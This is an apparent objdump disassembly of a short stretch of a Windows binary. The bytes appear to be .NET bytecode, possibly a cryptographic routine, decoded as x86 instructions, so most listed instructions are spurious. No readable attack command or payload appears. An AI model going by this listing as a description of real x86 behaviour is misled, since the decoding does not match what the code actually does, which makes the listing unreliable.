  405160:	00 28                	add    %ch,(%eax)
  405162:	14 00                	adc    $0x0,%al
  405164:	00 0a                	add    %cl,(%edx)
  405166:	2a da                	sub    %dl,%bl
  405168:	73 62                	jae    0x4051cc
  40516a:	00 00                	add    %al,(%eax)
  40516c:	06                   	push   %es
  40516d:	25 72 21 01 00       	and    $0x12172,%eax
  405172:	70 6f                	jo     0x4051e3
  405174:	4d                   	dec    %ebp
  405175:	00 00                	add    %al,(%eax)
  405177:	06                   	push   %es
  405178:	72 61                	jb     0x4051db
  40517a:	07                   	pop    %es
  40517b:	00 70 6f             	add    %dh,0x6f(%eax)
  40517e:	5a                   	pop    %edx
  40517f:	00 00                	add    %al,(%eax)
  405181:	06                   	push   %es
  405182:	25 72 61 07 00       	and    $0x76172,%eax
  405187:	70 6f                	jo     0x4051f8
  405189:	4d                   	dec    %ebp
  40518a:	00 00                	add    %al,(%eax)
  40518c:	06                   	push   %es
  40518d:	02 6f 5a             	add    0x5a(%edi),%ch
  405190:	00 00                	add    %al,(%eax)
  405192:	06                   	push   %es
  405193:	6f                   	outsl  %ds:(%esi),(%dx)
  405194:	57                   	push   %edi
  405195:	00 00                	add    %al,(%eax)
  405197:	06                   	push   %es
  405198:	28 1e                	sub    %bl,(%esi)
  40519a:	00 00                	add    %al,(%eax)
  40519c:	06                   	push   %es
  40519d:	2a 2e                	sub    (%esi),%ch
  40519f:	73 83                	jae    0x405124
  4051a1:	00 00                	add    %al,(%eax)
  4051a3:	0a 80 37 00 00 04    	or     0x4000037(%eax),%al
  4051a9:	2a 00                	sub    (%eax),%al
  4051ab:	00 1b                	add    %bl,(%ebx)
  4051ad:	30 03                	xor    %al,(%ebx)
  4051af:	00 53 00             	add    %dl,0x0(%ebx)
  4051b2:	00 00                	add    %al,(%eax)
  4051b4:	27                   	daa
  4051b5:	00 00                	add    %al,(%eax)
  4051b7:	11 02                	adc    %eax,(%edx)
  4051b9:	28 1a                	sub    %bl,(%edx)
  4051bb:	00 00                	add    %al,(%eax)
  4051bd:	0a 03                	or     (%ebx),%al
  4051bf:	28 f7                	sub    %dh,%bh
  4051c1:	00 00                	add    %al,(%eax)
  4051c3:	0a 2c 0b             	or     (%ebx,%ecx,1),%ch
  4051c6:	72 6d                	jb     0x405235
  4051c8:	07                   	pop    %es
  4051c9:	00 70 73             	add    %dh,0x73(%eax)
  4051cc:	f8                   	clc
  4051cd:	00 00                	add    %al,(%eax)
  4051cf:	0a 7a 03             	or     0x3(%edx),%bh
  4051d2:	7e 3e                	jle    0x405212
  4051d4:	00 00                	add    %al,(%eax)
  4051d6:	04 20                	add    $0x20,%al
  4051d8:	50                   	push   %eax
  4051d9:	c3                   	ret
  4051da:	00 00                	add    %al,(%eax)
  4051dc:	73 f9                	jae    0x4051d7
  4051de:	00 00                	add    %al,(%eax)
  4051e0:	0a 0a                	or     (%edx),%cl
  4051e2:	02 06                	add    (%esi),%al
  4051e4:	1f                   	pop    %ds
  4051e5:	20 6f fa             	and    %ch,-0x6(%edi)
  4051e8:	00 00                	add    %al,(%eax)
  4051ea:	0a 7d 3c             	or     0x3c(%ebp),%bh
  4051ed:	00 00                	add    %al,(%eax)
  4051ef:	04 02                	add    $0x2,%al
  4051f1:	06                   	push   %es
  4051f2:	1f                   	pop    %ds
  4051f3:	40                   	inc    %eax
  4051f4:	6f                   	outsl  %ds:(%esi),(%dx)
  4051f5:	fa                   	cli
  4051f6:	00 00                	add    %al,(%eax)
  4051f8:	0a 7d 3d             	or     0x3d(%ebp),%bh
  4051fb:	00 00                	add    %al,(%eax)
  4051fd:	04 de                	add    $0xde,%al
  4051ff:	0a 06                	or     (%esi),%al
  405201:	2c 06                	sub    $0x6,%al
  405203:	06                   	push   %es
  405204:	6f                   	outsl  %ds:(%esi),(%dx)
  405205:	33 00                	xor    (%eax),%eax
  405207:	00 0a                	add    %cl,(%edx)
  405209:	dc 2a                	fsubrl (%edx)
  40520b:	00 01                	add    %al,(%ecx)
  40520d:	10 00                	adc    %al,(%eax)
  40520f:	00 02                	add    %al,(%edx)
  405211:	00 2a                	add    %ch,(%edx)
  405213:	00 1e                	add    %bl,(%esi)
  405215:	48                   	dec    %eax
  405216:	00 0a                	add    %cl,(%edx)
  405218:	00 00                	add    %al,(%eax)
  40521a:	00 00                	add    %al,(%eax)
  40521c:	5e                   	pop    %esi
  40521d:	02 28                	add    (%eax),%ch
  40521f:	1b 00                	sbb    (%eax),%eax
  405221:	00 0a                	add    %cl,(%edx)
  405223:	03 6f 21             	add    0x21(%edi),%ebp
  405226:	00 00                	add    %al,(%eax)
  405228:	0a 28                	or     (%eax),%ch
  40522a:	99                   	cltd
  40522b:	00 00                	add    %al,(%eax)
  40522d:	06                   	push   %es
  40522e:	28 fb                	sub    %bh,%bl
  405230:	00 00                	add    %al,(%eax)
  405232:	0a 2a                	or     (%edx),%ch
  405234:	1b 30                	sbb    (%eax),%esi
  405236:	05 00 00 01 00       	add    $0x10000,%eax
  40523b:	00 28                	add    %ch,(%eax)
  40523d:	00 00                	add    %al,(%eax)
  40523f:	11 03                	adc    %eax,(%ebx)
  405241:	2d 0b 72 b5 07       	sub    $0x7b5720b,%eax
  405246:	00 70 73             	add    %dh,0x73(%eax)
  405249:	fc                   	cld
  40524a:	00 00                	add    %al,(%eax)
  40524c:	0a 7a 73             	or     0x73(%edx),%bh
  40524f:	79 00                	jns    0x405251
  405251:	00 0a                	add    %cl,(%edx)
  405253:	0a 06                	or     (%esi),%al
  405255:	1f                   	pop    %ds
  405256:	20 6a 6f             	and    %ch,0x6f(%edx)
  405259:	4e                   	dec    %esi
  40525a:	00 00                	add    %al,(%eax)
  40525c:	0a 73 fd             	or     -0x3(%ebx),%dh
  40525f:	00 00                	add    %al,(%eax)
  405261:	0a 0b                	or     (%ebx),%cl
  405263:	07                   	pop    %es
  405264:	20 00                	and    %al,(%eax)
  405266:	01 00                	add    %eax,(%eax)
  405268:	00 6f fe             	add    %ch,-0x2(%edi)
  40526b:	00 00                	add    %al,(%eax)
  40526d:	0a 07                	or     (%edi),%al
  40526f:	20 80 00 00 00 6f    	and    %al,0x6f000000(%eax)
  405275:	ff 00                	incl   (%eax)
  405277:	00 0a                	add    %cl,(%edx)
  405279:	07                   	pop    %es
  40527a:	17                   	pop    %ss
  40527b:	6f                   	outsl  %ds:(%esi),(%dx)
  40527c:	00 01                	add    %al,(%ecx)
  40527e:	00 0a                	add    %cl,(%edx)
  405280:	07                   	pop    %es
  405281:	18 6f 01             	sbb    %ch,0x1(%edi)
  405284:	01 00                	add    %eax,(%eax)
  405286:	0a 07                	or     (%edi),%al
  405288:	02 7b 3c             	add    0x3c(%ebx),%bh
  40528b:	00 00                	add    %al,(%eax)
  40528d:	04 6f                	add    $0x6f,%al
  40528f:	02 01                	add    (%ecx),%al
  405291:	00 0a                	add    %cl,(%edx)
  405293:	07                   	pop    %es
  405294:	6f                   	outsl  %ds:(%esi),(%dx)
  405295:	03 01                	add    (%ecx),%eax
  405297:	00 0a                	add    %cl,(%edx)
  405299:	06                   	push   %es
  40529a:	07                   	pop    %es
  40529b:	6f                   	outsl  %ds:(%esi),(%dx)
  40529c:	04 01                	add    $0x1,%al
  40529e:	00 0a                	add    %cl,(%edx)
  4052a0:	17                   	pop    %ss
  4052a1:	73 05                	jae    0x4052a8
  4052a3:	01 00                	add    %eax,(%eax)
  4052a5:	0a 0c 06             	or     (%esi,%eax,1),%cl
  4052a8:	07                   	pop    %es
  4052a9:	6f                   	outsl  %ds:(%esi),(%dx)
  4052aa:	06                   	push   %es
  4052ab:	01 00                	add    %eax,(%eax)
  4052ad:	0a 16                	or     (%esi),%dl
  4052af:	07                   	pop    %es
  4052b0:	6f                   	outsl  %ds:(%esi),(%dx)
  4052b1:	06                   	push   %es
  4052b2:	01 00                	add    %eax,(%eax)
  4052b4:	0a 8e 69 6f 4c 00    	or     0x4c6f69(%esi),%cl
  4052ba:	00 0a                	add    %cl,(%edx)
  4052bc:	08 03                	or     %al,(%ebx)
  4052be:	16                   	push   %ss
  4052bf:	03 8e 69 6f 4c 00    	add    0x4c6f69(%esi),%ecx
  4052c5:	00 0a                	add    %cl,(%edx)
  4052c7:	08 6f 07             	or     %ch,0x7(%edi)
  4052ca:	01 00                	add    %eax,(%eax)
  4052cc:	0a 02                	or     (%edx),%al
  4052ce:	7b 3d                	jnp    0x40530d
  4052d0:	00 00                	add    %al,(%eax)
  4052d2:	04 73                	add    $0x73,%al
  4052d4:	08 01                	or     %al,(%ecx)
  4052d6:	00 0a                	add    %cl,(%edx)
  4052d8:	0d 09 06 6f 09       	or     $0x96f0609,%eax
  4052dd:	01 00                	add    %eax,(%eax)
  4052df:	0a 1f                	or     (%edi),%bl
  4052e1:	20 06                	and    %al,(%esi)
  4052e3:	6f                   	outsl  %ds:(%esi),(%dx)
  4052e4:	09 01                	or     %eax,(%ecx)
  4052e6:	00 0a                	add    %cl,(%edx)
  4052e8:	8e 69 1f             	mov    0x1f(%ecx),%gs
  4052eb:	20 59 6f             	and    %bl,0x6f(%ecx)
  4052ee:	0a 01                	or     (%ecx),%al
  4052f0:	00 0a                	add    %cl,(%edx)
  4052f2:	13 04 06             	adc    (%esi,%eax,1),%eax
  4052f5:	16                   	push   %ss
  4052f6:	6a 6f                	push   $0x6f
  4052f8:	4e                   	dec    %esi
  4052f9:	00 00                	add    %al,(%eax)
  4052fb:	0a 06                	or     (%esi),%al
  4052fd:	11 04 16             	adc    %eax,(%esi,%edx,1)
  405300:	11 04 8e             	adc    %eax,(%esi,%ecx,4)
  405303:	69 6f 4c 00 00 0a de 	imul   $0xde0a0000,0x4c(%edi),%ebp
  40530a:	1e                   	push   %ds
  40530b:	09 2c 06             	or     %ebp,(%esi,%eax,1)
  40530e:	09 6f 33             	or     %ebp,0x33(%edi)
  405311:	00 00                	add    %al,(%eax)
  405313:	0a dc                	or     %ah,%bl
  405315:	08 2c 06             	or     %ch,(%esi,%eax,1)
  405318:	08 6f 33             	or     %ch,0x33(%edi)
  40531b:	00 00                	add    %al,(%eax)
  40531d:	0a dc                	or     %ah,%bl
  40531f:	07                   	pop    %es
  405320:	2c 06                	sub    $0x6,%al
  405322:	07                   	pop    %es
  405323:	6f                   	outsl  %ds:(%esi),(%dx)
  405324:	33 00                	xor    (%eax),%eax
  405326:	00 0a                	add    %cl,(%edx)
  405328:	dc 06                	faddl  (%esi)
  40532a:	6f                   	outsl  %ds:(%esi),(%dx)
  40532b:	09 01                	or     %eax,(%ecx)
  40532d:	00 0a                	add    %cl,(%edx)
  40532f:	13 05 de 0a 06 2c    	adc    0x2c060ade,%eax
  405335:	06                   	push   %es
  405336:	06                   	push   %es
  405337:	6f                   	outsl  %ds:(%esi),(%dx)
  405338:	33 00                	xor    (%eax),%eax
  40533a:	00 0a                	add    %cl,(%edx)
  40533c:	dc 11                	fcoml  (%ecx)
  40533e:	05 2a 01 34 00       	add    $0x34012a,%eax
  405343:	00 02                	add    %al,(%edx)
  405345:	00 99 00 32 cb 00    	add    %bl,0xcb3200(%ecx)
  40534b:	0a 00                	or     (%eax),%al
  40534d:	00 00                	add    %al,(%eax)
  40534f:	00 02                	add    %al,(%edx)
  405351:	00 67 00             	add    %ah,0x0(%edi)
  405354:	6e                   	outsb  %ds:(%esi),(%dx)
  405355:	d5 00                	aad    $0x0
  405357:	0a 00                	or     (%eax),%al
  405359:	00 00                	add    %al,(%eax)
  40535b:	00 02                	add    %al,(%edx)
  40535d:	00 23                	add    %ah,(%ebx)
  40535f:	00 bc df 00 0a 00 00 	add    %bh,0xa00(%edi,%ebx,8)
  405366:	00 00                	add    %al,(%eax)
  405368:	02 00                	add    (%eax),%al
  40536a:	14 00                	adc    $0x0,%al
  40536c:	df f3                	fcomip %st(3),%st
  40536e:	00 0a                	add    %cl,(%edx)
  405370:	00 00                	add    %al,(%eax)
  405372:	00 00                	add    %al,(%eax)
  405374:	5e                   	pop    %esi
  405375:	28 1b                	sub    %bl,(%ebx)
  405377:	00 00                	add    %al,(%eax)
  405379:	0a 02                	or     (%edx),%al
  40537b:	03 28                	add    (%eax),%ebp
  40537d:	1c 00                	sbb    $0x0,%al
  40537f:	00 0a                	add    %cl,(%edx)
  405381:	28 9b 00 00 06 6f    	sub    %bl,0x6f060000(%ebx)
  405387:	1d 00 00 0a 2a       	sbb    $0x2a0a0000,%eax
  40538c:	1b 30                	sbb    (%eax),%esi
  40538e:	05 00 37 01 00       	add    $0x13700,%eax
  405393:	00 29                	add    %ch,(%ecx)
  405395:	00 00                	add    %al,(%eax)
  405397:	11 03                	adc    %eax,(%ebx)
  405399:	2d 0b 72 b5 07       	sub    $0x7b5720b,%eax
  40539e:	00 70 73             	add    %dh,0x73(%eax)
  4053a1:	fc                   	cld
  4053a2:	00 00                	add    %al,(%eax)
  4053a4:	0a 7a 03             	or     0x3(%edx),%bh
  4053a7:	73 4d                	jae    0x4053f6
  4053a9:	00 00                	add    %al,(%eax)
  4053ab:	0a 0a                	or     (%edx),%cl
  4053ad:	73 fd                	jae    0x4053ac
  4053af:	00 00                	add    %al,(%eax)
  4053b1:	0a 0b                	or     (%ebx),%cl
  4053b3:	07                   	pop    %es
  4053b4:	20 00                	and    %al,(%eax)
  4053b6:	01 00                	add    %eax,(%eax)
  4053b8:	00 6f fe             	add    %ch,-0x2(%edi)
  4053bb:	00 00                	add    %al,(%eax)
  4053bd:	0a 07                	or     (%edi),%al
  4053bf:	20 80 00 00 00 6f    	and    %al,0x6f000000(%eax)
  4053c5:	ff 00                	incl   (%eax)
  4053c7:	00 0a                	add    %cl,(%edx)
  4053c9:	07                   	pop    %es
  4053ca:	17                   	pop    %ss
  4053cb:	6f                   	outsl  %ds:(%esi),(%dx)
  4053cc:	00 01                	add    %al,(%ecx)
  4053ce:	00 0a                	add    %cl,(%edx)
  4053d0:	07                   	pop    %es
  4053d1:	18 6f 01             	sbb    %ch,0x1(%edi)
  4053d4:	01 00                	add    %eax,(%eax)
  4053d6:	0a 07                	or     (%edi),%al
  4053d8:	02 7b 3c             	add    0x3c(%ebx),%bh
  4053db:	00 00                	add    %al,(%eax)
  4053dd:	04 6f                	add    $0x6f,%al
  4053df:	02 01                	add    (%ecx),%al
  4053e1:	00 0a                	add    %cl,(%edx)
  4053e3:	02 7b 3d             	add    0x3d(%ebx),%bh
  4053e6:	00 00                	add    %al,(%eax)
  4053e8:	04 73                	add    $0x73,%al
  4053ea:	08 01                	or     %al,(%ecx)
  4053ec:	00 0a                	add    %cl,(%edx)
  4053ee:	0d 09 06 6f 09       	or     $0x96f0609,%eax
  4053f3:	01 00                	add    %eax,(%eax)
  4053f5:	0a 1f                	or     (%edi),%bl
  4053f7:	20 06                	and    %al,(%esi)
  4053f9:	6f                   	outsl  %ds:(%esi),(%dx)
  4053fa:	09 01                	or     %eax,(%ecx)
  4053fc:	00 0a                	add    %cl,(%edx)
  4053fe:	8e 69 1f             	mov    0x1f(%ecx),%gs
  405401:	20 59 6f             	and    %bl,0x6f(%ecx)
  405404:	0a 01                	or     (%ecx),%al
  405406:	00 0a                	add    %cl,(%edx)
  405408:	13 04 1f             	adc    (%edi,%ebx,1),%eax
  40540b:	20 8d 57 00 00 01    	and    %cl,0x1000057(%ebp)
  405411:	13 05 06 11 05 16    	adc    0x16051106,%eax
  405417:	11 05 8e 69 6f 45    	adc    %eax,0x456f698e
  40541d:	00 00                	add    %al,(%eax)
  40541f:	0a 26                	or     (%esi),%ah
  405421:	02 11                	add    (%ecx),%dl
  405423:	04 11                	add    $0x11,%al
  405425:	05 28 9c 00 00       	add    $0x9c28,%eax
  40542a:	06                   	push   %es
  40542b:	2d 0b 72 e3 07       	sub    $0x7e3720b,%eax
  405430:	00 70 73             	add    %dh,0x73(%eax)
  405433:	0b 01                	or     (%ecx),%eax
  405435:	00 0a                	add    %cl,(%edx)
  405437:	7a de                	jp     0x405417
  405439:	0a 09                	or     (%ecx),%cl
  40543b:	2c 06                	sub    $0x6,%al
  40543d:	09 6f 33             	or     %ebp,0x33(%edi)
  405440:	00 00                	add    %al,(%eax)
  405442:	0a dc                	or     %ah,%bl
  405444:	1f                   	pop    %ds
  405445:	10 8d 57 00 00 01    	adc    %cl,0x1000057(%ebp)
  40544b:	0c 06                	or     $0x6,%al
  40544d:	08 16                	or     %dl,(%esi)
  40544f:	1f                   	pop    %ds
  405450:	10 6f 45             	adc    %ch,0x45(%edi)
  405453:	00 00                	add    %al,(%eax)
  405455:	0a 26                	or     (%esi),%ah
  405457:	07                   	pop    %es
  405458:	08 6f 0c             	or     %ch,0xc(%edi)
  40545b:	01 00                	add    %eax,(%eax)
  40545d:	0a 06                	or     (%esi),%al
  40545f:	07                   	pop    %es
  405460:	6f                   	outsl  %ds:(%esi),(%dx)
  405461:	0d 01 00 0a 16       	or     $0x160a0001,%eax
  405466:	73 05                	jae    0x40546d
  405468:	01 00                	add    %eax,(%eax)
  40546a:	0a 13                	or     (%ebx),%dl
  40546c:	06                   	push   %es
  40546d:	06                   	push   %es
  40546e:	6f                   	outsl  %ds:(%esi),(%dx)
  40546f:	75 00                	jne    0x405471
  405471:	00 0a                	add    %cl,(%edx)
  405473:	1f                   	pop    %ds
  405474:	10 6a 59             	adc    %ch,0x59(%edx)
  405477:	17                   	pop    %ss
  405478:	6a 58                	push   $0x58
  40547a:	d4 8d                	aam    $0x8d
  40547c:	57                   	push   %edi
  40547d:	00 00                	add    %al,(%eax)
  40547f:	01 13                	add    %edx,(%ebx)
  405481:	07                   	pop    %es
  405482:	11 06                	adc    %eax,(%esi)
  405484:	11 07                	adc    %eax,(%edi)
  405486:	16                   	push   %ss
  405487:	11 07                	adc    %eax,(%edi)
  405489:	8e 69 6f             	mov    0x6f(%ecx),%gs
  40548c:	45                   	inc    %ebp
  40548d:	00 00                	add    %al,(%eax)
  40548f:	0a 8d 57 00 00 01    	or     0x1000057(%ebp),%cl
  405495:	13 08                	adc    (%eax),%ecx
  405497:	11 07                	adc    %eax,(%edi)
  405499:	16                   	push   %ss
  40549a:	11 08                	adc    %ecx,(%eax)
  40549c:	16                   	push   %ss
  40549d:	11 08                	adc    %ecx,(%eax)
  40549f:	8e 69 28             	mov    0x28(%ecx),%gs
  4054a2:	0e                   	push   %cs
  4054a3:	01 00                	add    %eax,(%eax)
  4054a5:	0a 11                	or     (%ecx),%dl
  4054a7:	08 13                	or     %dl,(%ebx)
  4054a9:	09 de                	or     %ebx,%esi
  4054ab:	20 11                	and    %dl,(%ecx)
  4054ad:	06                   	push   %es
  4054ae:	2c 07                	sub    $0x7,%al
  4054b0:	11 06                	adc    %eax,(%esi)
  4054b2:	6f                   	outsl  %ds:(%esi),(%dx)
  4054b3:	33 00                	xor    (%eax),%eax
  4054b5:	00 0a                	add    %cl,(%edx)
  4054b7:	dc 07                	faddl  (%edi)
  4054b9:	2c 06                	sub    $0x6,%al
  4054bb:	07                   	pop    %es
  4054bc:	6f                   	outsl  %ds:(%esi),(%dx)
  4054bd:	33 00                	xor    (%eax),%eax
  4054bf:	00 0a                	add    %cl,(%edx)
  4054c1:	dc 06                	faddl  (%esi)
  4054c3:	2c 06                	sub    $0x6,%al
  4054c5:	06                   	push   %es
  4054c6:	6f                   	outsl  %ds:(%esi),(%dx)
  4054c7:	33 00                	xor    (%eax),%eax
  4054c9:	00 0a                	add    %cl,(%edx)
  4054cb:	dc 11                	fcoml  (%ecx)
  4054cd:	09 2a                	or     %ebp,(%edx)
  4054cf:	00 41 64             	add    %al,0x64(%ecx)
  4054d2:	00 00                	add    %al,(%eax)
  4054d4:	02 00                	add    (%eax),%al
  4054d6:	00 00                	add    %al,(%eax)
  4054d8:	57                   	push   %edi
  4054d9:	00 00                	add    %al,(%eax)
  4054db:	00 4b 00             	add    %cl,0x0(%ebx)
  4054de:	00 00                	add    %al,(%eax)
  4054e0:	a2 00 00 00 0a       	mov    %al,0xa000000
  4054e5:	00 00                	add    %al,(%eax)
  4054e7:	00 00                	add    %al,(%eax)
  4054e9:	00 00                	add    %al,(%eax)
  4054eb:	00 02                	add    %al,(%edx)
  4054ed:	00 00                	add    %al,(%eax)
  4054ef:	00 d5                	add    %dl,%ch
  4054f1:	00 00                	add    %al,(%eax)
  4054f3:	00 3f                	add    %bh,(%edi)
  4054f5:	00 00                	add    %al,(%eax)
  4054f7:	00 14 01             	add    %dl,(%ecx,%eax,1)
  4054fa:	00 00                	add    %al,(%eax)
  4054fc:	0c 00                	or     $0x0,%al
  4054fe:	00 00                	add    %al,(%eax)
  405500:	00 00                	add    %al,(%eax)
  405502:	00 00                	add    %al,(%eax)
  405504:	02 00                	add    (%eax),%al
  405506:	00 00                	add    %al,(%eax)
  405508:	1b 00                	sbb    (%eax),%eax
  40550a:	00 00                	add    %al,(%eax)
  40550c:	05 01 00 00 20       	add    $0x20000001,%eax
  405511:	01 00                	add    %eax,(%eax)
  405513:	00 0a                	add    %cl,(%edx)
  405515:	00 00                	add    %al,(%eax)
  405517:	00 00                	add    %al,(%eax)
  405519:	00 00                	add    %al,(%eax)
  40551b:	00 02                	add    %al,(%edx)
  40551d:	00 00                	add    %al,(%eax)
  40551f:	00 15 00 00 00 15    	add    %dl,0x15000000
  405525:	01 00                	add    %eax,(%eax)
  405527:	00 2a                	add    %ch,(%edx)
  405529:	01 00                	add    %eax,(%eax)
  40552b:	00 0a                	add    %cl,(%edx)
  40552d:	00 00                	add    %al,(%eax)
  40552f:	00 00                	add    %al,(%eax)
  405531:	00 00                	add    %al,(%eax)
  405533:	00 13                	add    %dl,(%ebx)
  405535:	30 03                	xor    %al,(%ebx)
  405537:	00 1c 00             	add    %bl,(%eax,%eax,1)
  40553a:	00 00                	add    %al,(%eax)
  40553c:	2a 00                	sub    (%eax),%al
  40553e:	00 11                	add    %dl,(%ecx)
  405540:	17                   	pop    %ss
  405541:	0a 16                	or     (%esi),%dl
  405543:	0b 2b                	or     (%ebx),%ebp
  405545:	0e                   	push   %cs
  405546:	03 07                	add    (%edi),%eax
  405548:	91                   	xchg   %eax,%ecx
  405549:	04 07                	add    $0x7,%al
  40554b:	91                   	xchg   %eax,%ecx
  40554c:	2e 02 16             	add    %cs:(%esi),%dl
  40554f:	0a 07                	or     (%edi),%al
  405551:	17                   	pop    %ss
  405552:	58                   	pop    %eax
  405553:	0b 07                	or     (%edi),%eax
  405555:	03 8e 69 32 ec 06    	add    0x6ec3269(%esi),%ecx
  40555b:	2a 62 1f             	sub    0x1f(%edx),%ah
  40555e:	20 8d 57 00 00 01    	and    %cl,0x1000057(%ebp)
  405564:	25 d0 3f 00 00       	and    $0x3fd0,%eax
  405569:	04 28                	add    $0x28,%al
  40556b:	78 00                	js     0x40556d
  40556d:	00 0a                	add    %cl,(%edx)
  40556f:	80 3e 00             	cmpb   $0x0,(%esi)
  405572:	00 04 2a             	add    %al,(%edx,%ebp,1)
  405575:	00 00                	add    %al,(%eax)
  405577:	00 1b                	add    %bl,(%ebx)
  405579:	30 03                	xor    %al,(%ebx)
  40557b:	00 65 00             	add    %ah,0x0(%ebp)
  40557e:	00 00                	add    %al,(%eax)
  405580:	2b 00                	sub    (%eax),%eax
  405582:	00 11                	add    %dl,(%ecx)
  405584:	28 1b                	sub    %bl,(%ebx)
  405586:	00 00                	add    %al,(%eax)
  405588:	0a 02                	or     (%edx),%al
  40558a:	6f                   	outsl  %ds:(%esi),(%dx)
  40558b:	21 00                	and    %eax,(%eax)
  40558d:	00 0a                	add    %cl,(%edx)
  40558f:	0a 73 0f             	or     0xf(%ebx),%dh
  405592:	01 00                	add    %eax,(%eax)
  405594:	0a 0c 08             	or     (%eax,%ecx,1),%cl
  405597:	06                   	push   %es
  405598:	6f                   	outsl  %ds:(%esi),(%dx)
  405599:	c5 00                	lds    (%eax),%eax
  40559b:	00 0a                	add    %cl,(%edx)
  40559d:	0a de                	or     %dh,%bl
  40559f:	0a 08                	or     (%eax),%cl
  4055a1:	2c 06                	sub    $0x6,%al
  4055a3:	08 6f 33             	or     %ch,0x33(%edi)
  4055a6:	00 00                	add    %al,(%eax)
  4055a8:	0a dc                	or     %ah,%bl
  4055aa:	73 53                	jae    0x4055ff
  4055ac:	00 00                	add    %al,(%eax)
  4055ae:	0a 0b                	or     (%ebx),%cl
  4055b0:	06                   	push   %es
  4055b1:	0d 16 13 04 2b       	or     $0x2b041316,%eax
  4055b6:	1f                   	pop    %ds
  4055b7:	09 11                	or     %edx,(%ecx)
  4055b9:	04 91                	add    $0x91,%al
  4055bb:	13 05 07 12 05 72    	adc    0x72051207,%eax
  4055c1:	39 08                	cmp    %ecx,(%eax)
  4055c3:	00 70 28             	add    %dh,0x28(%eax)
  4055c6:	c6 00 00             	movb   $0x0,(%eax)
  4055c9:	0a 6f 55             	or     0x55(%edi),%ch
  4055cc:	00 00                	add    %al,(%eax)
  4055ce:	0a 26                	or     (%esi),%ah
  4055d0:	11 04 17             	adc    %eax,(%edi,%edx,1)
  4055d3:	58                   	pop    %eax
  4055d4:	13 04 11             	adc    (%ecx,%edx,1),%eax
  4055d7:	04 09                	add    $0x9,%al
  4055d9:	8e 69 32             	mov    0x32(%ecx),%gs
  4055dc:	da 07                	fiaddl (%edi)
  4055de:	6f                   	outsl  %ds:(%esi),(%dx)
  4055df:	38 00                	cmp    %al,(%eax)
  4055e1:	00 0a                	add    %cl,(%edx)
  4055e3:	6f                   	outsl  %ds:(%esi),(%dx)
  4055e4:	c8 00 00 0a          	enter  $0x0,$0xa
  4055e8:	2a 00                	sub    (%eax),%al
  4055ea:	00 00                	add    %al,(%eax)
  4055ec:	01 10                	add    %edx,(%eax)
  4055ee:	00 00                	add    %al,(%eax)
  4055f0:	02 00                	add    (%eax),%al
  4055f2:	12 00                	adc    (%eax),%al
  4055f4:	0a 1c 00             	or     (%eax,%eax,1),%bl
  4055f7:	0a 00                	or     (%eax),%al
  4055f9:	00 00                	add    %al,(%eax)
  4055fb:	00 1b                	add    %bl,(%ebx)
  4055fd:	30 02                	xor    %al,(%edx)
  4055ff:	00 1c 00             	add    %bl,(%eax,%eax,1)
  405602:	00 00                	add    %al,(%eax)
  405604:	2c 00                	sub    $0x0,%al
  405606:	00 11                	add    %dl,(%ecx)
  405608:	73 0f                	jae    0x405619
  40560a:	01 00                	add    %eax,(%eax)
  40560c:	0a 0a                	or     (%edx),%cl
  40560e:	06                   	push   %es
  40560f:	02 6f c5             	add    -0x3b(%edi),%ch
  405612:	00 00                	add    %al,(%eax)
  405614:	0a 0b                	or     (%ebx),%cl
  405616:	de 0a                	fimuls (%edx)
  405618:	06                   	push   %es
  405619:	2c 06                	sub    $0x6,%al
  40561b:	06                   	push   %es
  40561c:	6f                   	outsl  %ds:(%esi),(%dx)
  40561d:	33 00                	xor    (%eax),%eax
  40561f:	00 0a                	add    %cl,(%edx)
  405621:	dc 07                	faddl  (%edi)
  405623:	2a 01                	sub    (%ecx),%al
  405625:	10 00                	adc    %al,(%eax)
  405627:	00 02                	add    %al,(%edx)
  405629:	00 06                	add    %al,(%esi)
  40562b:	00 0a                	add    %cl,(%edx)
  40562d:	10 00                	adc    %al,(%eax)
  40562f:	0a 00                	or     (%eax),%al
  405631:	00 00                	add    %al,(%eax)
  405633:	00 1b                	add    %bl,(%ebx)
  405635:	30 04 00             	xor    %al,(%eax,%eax,1)
  405638:	58                   	pop    %eax
  405639:	00 00                	add    %al,(%eax)
  40563b:	00 2d 00 00 11 02    	add    %ch,0x2110000
  405641:	73 4d                	jae    0x405690
  405643:	00 00                	add    %al,(%eax)
  405645:	0a 0a                	or     (%edx),%cl
  405647:	1a 8d 57 00 00 01    	sbb    0x1000057(%ebp),%cl
  40564d:	0b 06                	or     (%esi),%eax
  40564f:	07                   	pop    %es
  405650:	16                   	push   %ss
  405651:	1a 6f 45             	sbb    0x45(%edi),%ch
  405654:	00 00                	add    %al,(%eax)
  405656:	0a 26                	or     (%esi),%ah
  405658:	07                   	pop    %es
  405659:	16                   	push   %ss
  40565a:	28 44 00 00          	sub    %al,0x0(%eax,%eax,1)
  40565e:	0a 0c 06             	or     (%esi,%eax,1),%cl
  405661:	16                   	push   %ss
  405662:	73 10                	jae    0x405674
  405664:	01 00                	add    %eax,(%eax)
  405666:	0a 0d 08 8d 57 00    	or     0x578d08,%cl
  40566c:	00 01                	add    %al,(%ecx)
  40566e:	13 04 09             	adc    (%ecx,%ecx,1),%eax
  405671:	11 04 16             	adc    %eax,(%esi,%edx,1)
  405674:	08 6f 45             	or     %ch,0x45(%edi)
  405677:	00 00                	add    %al,(%eax)
  405679:	0a 26                	or     (%esi),%ah
  40567b:	11 04 13             	adc    %eax,(%ebx,%edx,1)
  40567e:	05 de 14 09 2c       	add    $0x2c0914de,%eax
  405683:	06                   	push   %es
  405684:	09 6f 33             	or     %ebp,0x33(%edi)
  405687:	00 00                	add    %al,(%eax)
  405689:	0a dc                	or     %ah,%bl
  40568b:	06                   	push   %es
  40568c:	2c 06                	sub    $0x6,%al
  40568e:	06                   	push   %es
  40568f:	6f                   	outsl  %ds:(%esi),(%dx)
  405690:	33 00                	xor    (%eax),%eax
  405692:	00 0a                	add    %cl,(%edx)
  405694:	dc 11                	fcoml  (%ecx)
  405696:	05 2a 01 1c 00       	add    $0x1c012a,%eax
  40569b:	00 02                	add    %al,(%edx)
  40569d:	00 28                	add    %ch,(%eax)
  40569f:	00 19                	add    %bl,(%ecx)
  4056a1:	41                   	inc    %ecx
  4056a2:	00 0a                	add    %cl,(%edx)
  4056a4:	00 00                	add    %al,(%eax)
  4056a6:	00 00                	add    %al,(%eax)
  4056a8:	02 00                	add    (%eax),%al
  4056aa:	07                   	pop    %es
  4056ab:	00 44 4b 00          	add    %al,0x0(%ebx,%ecx,2)
  4056af:	0a 00                	or     (%eax),%al
  4056b1:	00 00                	add    %al,(%eax)
